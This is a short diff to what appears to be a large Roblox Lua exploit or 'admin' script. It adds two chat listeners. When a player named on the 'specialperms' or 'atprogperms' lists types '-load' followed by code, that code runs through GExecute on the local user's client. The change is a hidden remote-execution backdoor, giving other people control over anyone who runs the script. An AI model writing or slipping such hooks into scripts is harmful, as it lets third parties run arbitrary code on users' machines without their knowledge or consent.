@@ -8367,6 +8367,13 @@ v.Chatted:Connect(function(msg)
         			Execute(string.sub(msg, 6))
     		end
 
+           	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+        			GExecute(string.sub(msg, 7))
+    		end
+
+           	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+        			GExecute(string.sub(msg, 7))
+    		end
 
                 end)
 -- ADMIN
